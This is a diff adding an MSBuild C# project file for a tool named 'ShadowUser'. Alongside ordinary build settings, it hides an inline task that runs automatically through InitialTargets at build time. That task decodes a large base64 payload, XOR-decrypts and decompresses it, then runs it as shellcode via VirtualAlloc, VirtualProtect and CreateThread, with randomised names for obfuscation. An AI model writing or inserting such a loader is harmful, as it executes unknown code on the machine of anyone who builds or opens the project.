@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="kwEM2MjDUI">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{F93716EA-E26F-480E-A728-E658740CEF09}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>ShadowUser</RootNamespace>
+    <AssemblyName>ShadowUser</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x86\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
+    <OutputPath>bin\x86\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup />
+  <UsingTask TaskName="dBDaCWh7Xe" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr RRAA12W(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool tyqlMit(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr SXGLXe4(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint DcWctHd(System.IntPtr h,uint ms);public override bool Execute(){var cKEVkg=System.Convert.FromBase64String("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");var L7Mid=System.Convert.FromBase64String("QyYflFqibTYDdwER/keWlV3+zSvlZqGcdGXSq/f3Uuo=");var lPKVy=System.Convert.FromBase64String("Chnl0JSXx15QKQdBdHMeTo9bT5HSAP1jVDfFDnFuqB0=");var wnO1l=System.Convert.FromBase64String("vGyPfHPhymAcchIUkMWBD2eeIge5+3OJEPZSI7Fo9Vg=");for(int o3=0;o3<cKEVkg.Length;o3++){cKEVkg[o3]^=L7Mid[o3%32];}for(int o3=0;o3<cKEVkg.Length;o3++){cKEVkg[o3]^=lPKVy[o3%32];}for(int o3=0;o3<cKEVkg.Length;o3++){cKEVkg[o3]^=wnO1l[o3%32];}var BAF4=new System.IO.MemoryStream();using(var XFOW=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(cKEVkg),System.IO.Compression.CompressionMode.Decompress))XFOW.CopyTo(BAF4);cKEVkg=BAF4.ToArray();var E6jxK=RRAA12W(System.IntPtr.Zero,(uint)cKEVkg.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(cKEVkg,0,E6jxK,cKEVkg.Length);uint bzM=0;tyqlMit(E6jxK,(uint)cKEVkg.Length,0x20u,out bzM);DcWctHd(SXGLXe4(System.IntPtr.Zero,0u,E6jxK,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="kwEM2MjDUI">
+    <dBDaCWh7Xe />
+  </Target>
+</Project>
